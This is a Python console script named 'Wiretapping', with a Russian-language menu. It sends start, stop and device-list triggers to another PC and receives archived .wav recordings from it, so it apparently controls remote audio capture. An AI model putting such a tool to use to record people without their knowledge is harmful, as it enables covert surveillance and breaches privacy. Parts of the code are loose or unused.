from threading import Thread
from datetime import datetime
from time import perf_counter
from compresse import decompressed
from network.connection import client, server
from data import Trigger, Event
import converter
import json



# "saved files/"+gen_path()
def get_file():
    while True:
        lis.get_byte_line(lis.listening())
        decompressed(archive_file="arhive_getting.zip")
        Wiretapping.evn.is_set = True

class Wiretapping:
    start = Trigger.parse_file("triger_/triger_start.json")
    end   = Trigger.parse_file("triger_/triger_end.json")
    get   = Trigger.parse_file("triger_/triger_get_id_device.json")
    setting: dict = {}

    evn   = Event()
    th = Thread(target=get_file, daemon=True)

with open("wiretapping_config.json", "rb") as f:
    Wiretapping.setting = json.load(f)
def gen_path():
    return f"{datetime.now().month}m:{datetime.now().day}d_{perf_counter()}.wav"

def start_message():
    print(" по умолчанию установлено локальное соединение, настроить можно в файле -> wiretapping_config.json\n",
            "json запросы можно настроить в деректории -> triger_\n\n")
    print(" start: начать прослушивание\n",
            "end: закончить прослушивание\n",
            "get: формирует файл со списком девайсов и их id\n",
            "save: общая синхронизация\n",
            "exit: выход")

lis   = server(port=Wiretapping.setting["self"]["_port"], host=Wiretapping.setting["self"]["_ip"])
cl    = client()

def menu():
    Wiretapping.th.start()
    while True:
        user_choice = input("you choice -> ")
        match user_choice:
            case "start":
                """
                if not Wiretapping.evn.is_set:
                    print("already working")
                else:
                    """
                cl.send_byte_code(converter.serialization(Wiretapping.start),
                                                port=Wiretapping.setting["other_pc"]["_port"],
                                                host=Wiretapping.setting["other_pc"]["_ip"])
                Wiretapping.evn.is_set = False
            case "end":
                cl.send_byte_code(converter.serialization(Wiretapping.end),
                                                    port=Wiretapping.setting["other_pc"]["_port"],
                                                    host=Wiretapping.setting["other_pc"]["_ip"])
            case "get":
                cl.send_byte_code(converter.serialization(Wiretapping.get),
                                                    port=Wiretapping.setting["other_pc"]["_port"],
                                                    host=Wiretapping.setting["other_pc"]["_ip"])
            case "save":
                Wiretapping.start = Trigger.parse_file("triger_/triger_start.json")
                Wiretapping.end   = Trigger.parse_file("triger_/triger_end.json")
                Wiretapping.get   = Trigger.parse_file("triger_/triger_get_id_device.json")

                with open("wiretapping_config.json", "rb") as f:
                    Wiretapping.setting = json.load(f)

            case "exit":
                break
            case _:
                print("error")


if __name__ == "__main__":
    start_message()
    menu()
